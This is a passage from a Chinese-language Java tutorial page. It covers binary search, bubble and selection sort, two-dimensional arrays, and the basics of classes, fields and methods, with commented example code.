class="number">1</span>)&#123;</span><br><span class="line">    System.out.println(value + <span class="string">"不存在"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    System.out.println(value + <span class="string">"的下标是"</span> + index);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用for</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exam2</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;<span class="comment">//数组是有序的</span></span><br><span class="line"><span class="keyword">int</span> value = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = -<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> left=<span class="number">0</span>,right=arr.length-<span class="number">1</span>,mid = (left+right)/<span class="number">2</span>; left&lt;=right; mid = (left + right)/<span class="number">2</span>)&#123;</span><br><span class="line">             <span class="comment">//找到结束</span></span><br><span class="line">            <span class="keyword">if</span>(value == arr[mid])&#123;</span><br><span class="line">                index = mid;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="comment">//没找到</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(value &gt; arr[mid])&#123;<span class="comment">//往右继续查找</span></span><br><span class="line">                <span class="comment">//移动左边界，使得mid往右移动</span></span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(value &lt; arr[mid])&#123;<span class="comment">//往左边继续查找</span></span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(index==-<span class="number">1</span>)&#123;</span><br><span class="line">    System.out.println(value + <span class="string">"不存在"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    System.out.println(value + <span class="string">"的下标是"</span> + index);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-6-排序"><a href="#4-3-6-排序" class="headerlink" title="4.3.6 排序"></a>4.3.6 排序</h3><p>数组的排序算法有千万种，我们只讲了两种：</p><p>1、冒泡排序</p><p>2、简单的直接排序</p><p>示例代码：冒泡：从小到大，从左到右两两比较</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;<span class="comment">//外循环的次数 = 轮数 = 数组的长度-1</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第1轮，i=1,从左到右两两比较，arr[0]与arr[1]。。。。。arr[3]与arr[4]</span></span><br><span class="line"><span class="comment">    第2轮，i=2,从左到右两两比较，arr[0]与arr[1]。。。。。arr[2]与arr[3]</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">    arr[j]与arr[j+1]比较</span></span><br><span class="line"><span class="comment">    找两个关键点：（1）j的起始值：0（2）找j的终止值，依次是3,2,1,0，得出j&lt;arr.length-i</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;arr.length-i; j++)&#123;</span><br><span class="line">        <span class="comment">//两两比较</span></span><br><span class="line">        <span class="comment">//从小到大，说明前面的比后面的大，就交换</span></span><br><span class="line">        <span class="keyword">if</span>(arr[j] &gt; arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> temp = arr[j];</span><br><span class="line">            arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">            arr[j+<span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：从大到小，从右到左</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[] arr = &#123;<span class="string">'h'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'j'</span>,<span class="string">'a'</span>,<span class="string">'v'</span>,<span class="string">'a'</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;<span class="comment">//外循环的次数 = 轮数 = 数组的长度-1</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第1轮，i=1，从右到左两两比较，arr[8]与arr[7]，arr[7]与arr[6]....arr[1]与arr[0]</span></span><br><span class="line"><span class="comment">    第2轮，i=2，从右到左两两比较，arr[8]与arr[7]，arr[7]与arr[6]....arr[2]与arr[1]</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">    第8轮，i=8，从右到左两两比较，arr[8]与arr[7]</span></span><br><span class="line"><span class="comment">       arr[j]与arr[j-1]</span></span><br><span class="line"><span class="comment">    找两个关键点：（1）j的起始值：8（2）找j的终止值，依次是1,2,3,。。。8，得出j&gt;=i</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">8</span>; j&gt;=i; j--)&#123;</span><br><span class="line">        <span class="comment">//从大到小，后面的元素 &gt; 前面的元素，就交换</span></span><br><span class="line">        <span class="keyword">if</span>(arr[j]&gt;arr[j-<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> temp = arr[j];</span><br><span class="line">            arr[j] = arr[j-<span class="number">1</span>];</span><br><span class="line">            arr[j-<span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：简单的直接选择排序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">8</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;<span class="comment">//外循环的次数 = 轮数 = 数组的长度-1</span></span><br><span class="line">    <span class="comment">//（1）找出本轮未排序元素中的最值</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    未排序元素：</span></span><br><span class="line"><span class="comment">    第1轮：i=1,未排序，[0,4]</span></span><br><span class="line"><span class="comment">    第2轮：i=2,未排序，[1,4]</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    每一轮未排序元素的起始下标：0,1,2,3，正好是i-1的</span></span><br><span class="line"><span class="comment">    未排序的后面的元素依次：</span></span><br><span class="line"><span class="comment">    第1轮：[1,4]  j=1,2,3,4</span></span><br><span class="line"><span class="comment">    第2轮：[2,4]  j=2,3,4</span></span><br><span class="line"><span class="comment">    第3轮：[3,4]  j=3,4</span></span><br><span class="line"><span class="comment">    第4轮：[4,4]  j=4</span></span><br><span class="line"><span class="comment">    j的起点是i，终点都是4</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">int</span> max = arr[i-<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> index = i-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i; j&lt;arr.length; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[j] &gt; max)&#123;</span><br><span class="line">            max = arr[j];</span><br><span class="line">            index = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//（2）如果这个最值没有在它应该在的位置，就与这个位置的元素交换</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第1轮，最大值应该在[0]</span></span><br><span class="line"><span class="comment">    第2轮，最大值应该在[1]</span></span><br><span class="line"><span class="comment">    第3轮，最大值应该在[2]</span></span><br><span class="line"><span class="comment">    第4轮，最大值应该在[3]</span></span><br><span class="line"><span class="comment">    正好是i-1的值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(index != i-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//交换arr[i-1]与arr[index]</span></span><br><span class="line">        <span class="keyword">int</span> temp = arr[i-<span class="number">1</span>];</span><br><span class="line">        arr[i-<span class="number">1</span>] = arr[index];</span><br><span class="line">        arr[index] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示结果</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">System.out.print(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-二维数组"><a href="#4-4-二维数组" class="headerlink" title="4.4 二维数组"></a>4.4 二维数组</h2><p>二维数组的标记：[][]</p><h3 id="4-4-1-相关的表示方式"><a href="#4-4-1-相关的表示方式" class="headerlink" title="4.4.1 相关的表示方式"></a>4.4.1 相关的表示方式</h3><p>（1）二维数组的长度/行数： </p><p>​    二维数组名.length</p><p>（2）二维数组的其中一行：</p><p>​    二维数组名[行下标]</p><p>​    行下标的范围：[0, 二维数组名.length-1]</p><p>（3）每一行的列数：</p><p>​    二维数组名[行下标].length</p><p>​       因为二维数组的每一行是一个一维数组</p><p>（4）每一个元素</p><p>​    二维数组名[行下标][列下标]</p><h3 id="4-4-2-二维数组的声明和初始化"><a href="#4-4-2-二维数组的声明和初始化" class="headerlink" title="4.4.2 二维数组的声明和初始化"></a>4.4.2 二维数组的声明和初始化</h3><p>1、二维数组的声明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//推荐</span></span><br><span class="line"> 元素的数据类型[][] 二维数组的名称;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不推荐</span></span><br><span class="line">元素的数据类型  二维数组名[][];</span><br><span class="line"><span class="comment">//不推荐</span></span><br><span class="line"> 元素的数据类型[]  二维数组名[];</span><br></pre></td></tr></table></figure><p>面试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int[] x, y[];</span><br><span class="line">//x是一维数组，y是二维数组</span><br></pre></td></tr></table></figure><p>2、二维数组的初始化</p><p>（1）静态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">二维数组名 = <span class="keyword">new</span> 元素的数据类型[][]&#123;</span><br><span class="line">&#123;第一行的值列表&#125;, </span><br><span class="line">&#123;第二行的值列表&#125;,</span><br><span class="line">...</span><br><span class="line">&#123;第n行的值列表&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果声明与静态初始化一起完成</span></span><br><span class="line">元素的数据类型[][] 二维数组的名称 = &#123;</span><br><span class="line">&#123;第一行的值列表&#125;, </span><br><span class="line">&#123;第二行的值列表&#125;,</span><br><span class="line">...</span><br><span class="line">&#123;第n行的值列表&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>（2）动态初始化（不规则：每一行的列数可能不一样）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//（1）先确定总行数</span></span><br><span class="line">二维数组名 = <span class="keyword">new</span> 元素的数据类型[总行数][];</span><br><span class="line"></span><br><span class="line"><span class="comment">//（2）再确定每一行的列数</span></span><br><span class="line">二维数组名[行下标] = <span class="keyword">new</span> 元素的数据类型[该行的总列数];</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)再为元素赋值</span></span><br><span class="line">二维数组名[行下标][列下标] = 值;</span><br></pre></td></tr></table></figure><p>（3）动态初始化（规则：每一行的列数是相同的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//（1）确定行数和列数</span></span><br><span class="line">二维数组名 = <span class="keyword">new</span> 元素的数据类型[总行数][每一行的列数];</span><br><span class="line"></span><br><span class="line"><span class="comment">//（2）再为元素赋值</span></span><br><span class="line">二维数组名[行下标][列下标] = 值;</span><br></pre></td></tr></table></figure><h3 id="4-4-3-二维数组的遍历"><a href="#4-4-3-二维数组的遍历" class="headerlink" title="4.4.3 二维数组的遍历"></a>4.4.3 二维数组的遍历</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for(int i=0; i&lt;二维数组名.length; i++)&#123;</span><br><span class="line">    for(int j=0; j&lt;二维数组名[i].length; j++)&#123;</span><br><span class="line">        System.out.print(二维数组名[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第五章-面向对象基础"><a href="#第五章-面向对象基础" class="headerlink" title="第五章 面向对象基础"></a>第五章 面向对象基础</h1><h2 id="5-1-类与对象"><a href="#5-1-类与对象" class="headerlink" title="5.1 类与对象"></a>5.1 类与对象</h2><p>1、类：一类具有相同特性的事物的抽象描述。</p><p>​      对象：类的一个个体，实例，具体的存在。</p><p>​     类是对象的设计模板。</p><p>2、如何声明类？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    成员列表：属性、方法、构造器、代码块、内部类</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、如何创建对象？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> 类名();  <span class="comment">//匿名对象</span></span><br><span class="line"></span><br><span class="line">类名 对象名 = <span class="keyword">new</span> 类名(); <span class="comment">//有名对象</span></span><br></pre></td></tr></table></figure><h2 id="5-2-类的成员之一：属性"><a href="#5-2-类的成员之一：属性" class="headerlink" title="5.2 类的成员之一：属性"></a>5.2 类的成员之一：属性</h2><p>1、如何声明属性？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    【修饰符】 数据类型  属性名;    <span class="comment">//属性有默认值</span></span><br><span class="line">    【修饰符】 数据类型  属性名 = 值; <span class="comment">//属性有初始值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>说明：属性的类型可以是Java的任意类型，包括基本数据类型、引用数据类型（类、接口、数组等）</p></blockquote><p>总结：Java的数据类型</p><p>（1）基本数据类型</p><p>byte,short,int,long,float,double,char,boolean</p><p>（2）引用数据类型</p><p>①类：</p><p>​    例如：String、Student、Circle、System、Scanner、Math…</p><p>②接口：后面讲</p><p>③数组：</p><p>​    例如：int[]，String[]，char[]，int[][]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];</span><br><span class="line">这里把<span class="keyword">int</span>[]看成数组类型，是一种引用数据类型，右边赋值的是一个数组的对象</span><br><span class="line"></span><br><span class="line">元素的数据类型：<span class="keyword">int</span></span><br><span class="line">数组的数据类型：<span class="keyword">int</span>[]</span><br></pre></td></tr></table></figure><p>2、如何为属性赋值？</p><p>（1）在声明属性时显式赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    【修饰符】 数据类型  属性名 = 值; <span class="comment">//属性有初始值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">char</span> gender = <span class="string">'男'</span>;<span class="comment">//显式赋值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestStudent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(<span class="string">"姓名："</span> + s1.name);<span class="comment">//null</span></span><br><span class="line">        System.out.println(<span class="string">"性别："</span> + s1.gender);<span class="comment">//男</span></span><br><span class="line">        </span><br><span class="line">        s1.name = <span class="string">"小薇"</span>;<span class="comment">//修改属性的默认值</span></span><br><span class="line">        s1.gender = <span class="string">'女'</span>;<span class="comment">//修改属性的初始值</span></span><br><span class="line">        System.out.println(<span class="string">"姓名："</span> + s1.name);<span class="comment">//小薇</span></span><br><span class="line">        System.out.println(<span class="string">"性别："</span> + s1.gender);<span class="comment">//女</span></span><br><span class="line">        </span><br><span class="line">        Student s2 = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(<span class="string">"姓名："</span> + s2.name);<span class="comment">//null</span></span><br><span class="line">        System.out.println(<span class="string">"性别："</span> + s2.gender);<span class="comment">//男</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）创建对象之后赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    【修饰符】 数据类型  属性名; <span class="comment">//属性有默认值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建对象</span></span><br><span class="line">类名 对象名 = <span class="keyword">new</span>  类名();</span><br><span class="line"></span><br><span class="line"><span class="comment">//为对象的属性赋值</span></span><br><span class="line">对象名.属性名 = 值;</span><br></pre></td></tr></table></figure><p>3、如何访问属性的值？</p><p>（1）在本类的方法中访问</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14</span> * radius * radius;<span class="comment">//直接访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）在其他类的方法中访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestCircle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Circle c1 = <span class="keyword">new</span> Circle();</span><br><span class="line">        <span class="keyword">double</span> area = <span class="number">3.14</span> * c1.radius * c1.radius;<span class="comment">//对象名.属性名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、属性的特点</p><p>（1）属性有默认值</p><p>基本数据类型：</p><p>​    byte,short,int,long：0</p><p>​    float，double：0.0</p><p>​    char：\u0000</p><p>​    boolean：false</p><p>引用数据类型：</p><p>​    null</p><p>（2）每一个对象的属性是独立，互不干扰</p><p>5、对象属性的内存图</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">char</span> gender = <span class="string">'男'</span>;<span class="comment">//显式赋值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestStudent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(<span class="string">"姓名："</span> + s1.name);<span class="comment">//null</span></span><br><span class="line">        System.out.println(<span class="string">"性别："</span> + s1.gender);<span class="comment">//男</span></span><br><span class="line">        </span><br><span class="line">        s1.name = <span class="string">"小薇"</span>;</span><br><span class="line">        s1.gender = <span class="string">'女'</span>;</span><br><span class="line">        System.out.println(<span class="string">"姓名："</span> + s1.name);<span class="comment">//小薇</span></span><br><span class="line">        System.out.println(<span class="string">"性别："</span> + s1.gender);<span class="comment">//女</span></span><br><span class="line">        </span><br><span class="line">        Student s2 = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(<span class="string">"姓名："</span> + s2.name);<span class="comment">//null</span></span><br><span class="line">        System.out.println(<span class="string">"性别："</span> + s2.gender);<span class="comment">//男</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1558659534754.png" alt="1558659534754" title>                </div>                <div class="image-caption">1558659534754</div>            </figure><h2 id="5-4-类的成员之二：方法"><a href="#5-4-类的成员之二：方法" class="headerlink" title="5.4 类的成员之二：方法"></a>5.4 类的成员之二：方法</h2><h3 id="5-4-1-方法的概念"><a href="#5-4-1-方法的概念" class="headerlink" title="5.4.1 方法的概念"></a>5.4.1 方法的概念</h3><p>方法（method）：代表一个独立的可复用的功能</p><p>目的/好处：</p><p>（1）复用</p><p>（2）简化代码</p><h3 id="5-4-2-方法的语法"><a href="#5-4-2-方法的语法" class="headerlink" title="5.4.2 方法的语法"></a>5.4.2 方法的语法</h3><p>1、方法的声明格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    【修饰符】 返回值类型  方法名(【形参列表】)&#123;</span><br><span class="line">        方法体：实现功能的代码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><p>（1）【修饰符】：待讲</p><p>（2）返回值类型：</p><p>①void：表示无返回值</p><p>②非void：所有的Java数据类型都可以</p><p>（3）方法名：能很好的体现方法的功能</p><p>命名的规范：①见名知意②从第二个单词开始首字母大写</p><p>（4）【形参列表】：</p><p>​    在完成这个方法的功能时，需要一些数据，这些数据要由“调用者”来决定，那我们就可以设计形参。</p><p>​    语法格式：</p><p>​        ()：无参，空参</p><p>​        (数据类型  形参名)：一个形参</p><p>​        (数据类型1  形参名1,  ……,   数据类型n  形参名n)：n个形参</p><p>（5）方法体：实现方法的功能，最好一个方法就完成一个独立的功能。</p><p>2、方法的调用格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 